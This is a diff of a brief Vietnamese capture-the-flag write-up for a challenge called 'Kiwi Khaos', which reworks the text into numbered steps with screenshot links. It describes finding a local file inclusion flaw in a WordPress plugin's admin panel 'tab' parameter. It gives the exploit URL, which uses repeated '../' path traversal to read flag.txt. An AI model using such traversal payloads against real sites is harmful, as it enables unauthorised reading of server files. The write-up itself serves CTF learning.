@@ -1,6 +1,8 @@
 kiwi Khaos:
-(dựa trên wu gốc :https://blog.bitwall.ke/posts/kiwi-khaos/)
-use copilot /Synk để quét dò lỗ hổng trong code ta có lỗ hổng lfi trong path http://54.152.96.1:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=""
-
-thực hiện khai thác : 
-http://54.152.96.1:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=../../../../../../../../../../flag.txt
+  (dựa trên wu gốc :https://blog.bitwall.ke/posts/kiwi-khaos/)
+  1. use copilot /Synk để quét dò lỗ hổng trong code ta có lỗ hổng lfi trong path http://54.152.96.1:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=""
+  ảnh: https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/image-4.png
+  
+  2. thực hiện khai thác : 
+  http://54.152.96.1:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=../../../../../../../../../../flag.txt
+  ảnh: https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/image-7.png
